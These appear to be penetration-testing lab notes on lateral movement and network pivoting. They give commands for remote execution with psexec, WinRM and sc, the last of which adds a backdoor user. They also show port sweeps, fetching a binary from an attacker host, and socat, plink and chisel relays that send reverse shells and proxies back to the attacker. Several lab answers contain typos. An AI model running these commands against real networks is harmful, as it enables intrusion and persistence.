# 🚰 Pivoting

<figure><img src="../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>

### Moving Through the Network

Suppose we got our first compromise on the target network by using a phishing campaign. Usually, phishing campaigns are more effective against non-technical users, so our first access might be through a machine in the Marketing department

Marketing workstations will typically be limited through firewall policies to access any critical services on the network

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The simplest way would be to use standard administrative protocols like WinRM, RDP, VNC or SSH to connect to other machines around the network.

### Spawning Processes Remotely

methods an attacker has to spawn a process remotely, allowing them to run commands on machines where they have valid credentials:

#### Psexec

* **Ports:** 445/TCP (SMB)
* **Required Group Memberships:** Administrators

It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shell-session
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

#### Remote Process Creation Using WinRM

* **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* **Required Group Memberships:** Remote Management Users

it's web-based protocol used to send Powershell commands to Windows hosts remotely.

{% content-ref url="../../interacting-with-protocols-and-tools/tools/winrm.md" %}
[winrm.md](../../interacting-with-protocols-and-tools/tools/winrm.md)
{% endcontent-ref %}

```shell-session
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

from Powershell we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM.

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### Remotely Creating Services Using sc

* **Ports:**
  * 135/TCP, 49152-65535/TCP (DCE/RPC)
  * 445/TCP (RPC over SMB Named Pipes)
  * 139/TCP (RPC over SMB Named Pipes)
* **Required Group Memberships:** Administrators

Windows services can also be leveraged to run arbitrary commands since they execute a command when started.

A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can create and start a service named "THMservice" using the following commands:

```shell-session
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice 
```

The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

### Creating Scheduled Tasks Remotely

###

### Enumeration for pivoting:

`arp -a` checks the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently.

static mappings may be found in `/etc/hosts` on Linux, or `C:\Windows\System32\drivers\etc\hosts` on Windows. `/etc/resolv.conf` on Linux may also identify any local DNS servers

check the DNS servers for an interface is with `ipconfig /all`

**living off the land shell techniques**

use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:

`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`

If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.

Port scanning in bash can be done (ideally) entirely natively:

`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

#### plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client

{% embed url="https://fr.wikipedia.org/wiki/PuTTY" %}

the use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:\
`cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`

2. `echo y`: This command is used to output the letter 'y' to the console. In this context, it's used to automatically answer 'yes' to any prompts that may appear during the execution of Plink.exe.
3. `.\plink.exe`: This is the Plink executable. The `.\` is used to specify that the file is in the current directory.
4. `-R LOCAL_PORT:TARGET_IP:TARGET_PORT`: This is the remote forwarding local port (LOCAL\_PORT) should be forwarded to a remote address (TARGET\_IP) and port (TARGET\_PORT).

USERNAME@ATTACK the SSH service is running.

6. `-i KEYFILE`: This is used to specify the path to the private key file (KEYFILE) for authentication.
7. `-N`: This option is used to specify that no command will be sent once the connection is made (i.e., a reverse shell).

Ex:

&#x20;if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:\
`cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`

#### Socat

static binaries are easy to find for both [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86\_64.zip/download)

{% embed url="https://linuxfr.org/news/socat-un-outil-en-ligne-de-commande-pour-maitriser-vos-sockets" %}

if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

On Kali (inside the directory containing your Socat binary):

`sudo python3 -m http.server 80`

Then, on the target:\
`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`

***

after setting up a listener on your local machine, on the compromised server, use the following command to start the relay:\
`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`

if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:\
`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

So, this command sets up a TCP port forwarding from the local port 33060 to the remote address 172.16.0.10 on port 3306.

./socat`: Executes the` socat`command.`&#x20;

`2.`tcp-l:33060,fork,reuseaddr\`: Creates a TCP listener on localhost (127.0.0.1) at port 33060 with the following options:

* `fork`: Creates a new process for each incoming connection.
* `reuseaddr`: Allows the socket to be reused immediately after it is closed.

3. `tcp:172.16.0.10:3306`: Connects to the specified remote address (172.16.0.10) and port (3306).
4. `&`: Runs the command in the background.

Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

Use TCP port 8000 for the server listener, and do not background the process.

```
./socat -tcp-l:8000 tcp:172.16.0.200:443
```

**to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process:**

```
./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22&
```

#### Chisel

[Chisel](https://github.com/jpillora/chisel) is an tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not

to show pther file transfer methods, we could use SCP:\
`scp -i KEY chisel user@target:/tmp/chisel-USERNAME`

The chisel binary has two modes: _client_ and _server_. You can access the help menus for either with the command: `chisel client|server --help`

setting up a reverse SOCKS proxy with chisel. This connects _back_ from a compromised server to a listener waiting on our attacking machine.

On our own attacking box we would use a command that looks something like this:\
`./chisel server -p LISTEN_PORT --reverse &`

This sets up a listener on your chosen `LISTEN_PORT`.

On the compromised host, we would use the following command:\
`./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`

if we wanted to **Forward proxies**

on the compromised host we would use:\
`./chisel server -p LISTEN_PORT --socks5`

On our own attacking box we would then use:\
`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.

**remote port** forward is when we connect back from a compromised target to create the forward.

For a remote port forward, on our attacking machine we use the exact same command as before:\
`./chisel server -p LISTEN_PORT --reverse &`

Once again this sets up a chisel listener for the compromised host to connect back to.\
The command to connect back is slightly different this time, however:\
`./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`

let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:\
`./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &`

Connecting back to our attacking machine, functioning as a chisel server started with:\
`./chisel server -p 1337 --reverse &`

This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.

**Local port forward**

&#x20;On the compromised target we set up a chisel server:\
`./chisel server -p LISTEN_PORT`

We now connect to this from our attacking machine like so:\
`./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:\
`./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

_What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?_

```
./chisel client 176.16.0.200:4242 R:socks &
```

_How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process._

```
./chisel client 172.16.0.200:1337 33060:172.16.0.100:3306
```

_If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?_

```
./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
```

#### [sshuttle](https://github.com/sshuttle/sshuttle)

&#x20;it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy _without the use of proxychains_

First of all we need to install sshuttle. On Kali this is as easy as using the `apt` package manager:\
`sudo apt install sshuttle`

The base command for connecting to a server with sshuttle is as follows:\
`sshuttle -r username@address subnet`&#x20;

For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:\
`sshuttle -r user@172.16.0.5 172.16.0.0/24`

Rather than specifying subnets, we could also use the `-N` option which attempts to determine them automatically based on the compromised server's own routing table:\
`sshuttle -r username@address -N`

&#x20;when using key-based authentication, the final command looks something like this:\
`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`

To use our example from before, the command would be:\
`sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`
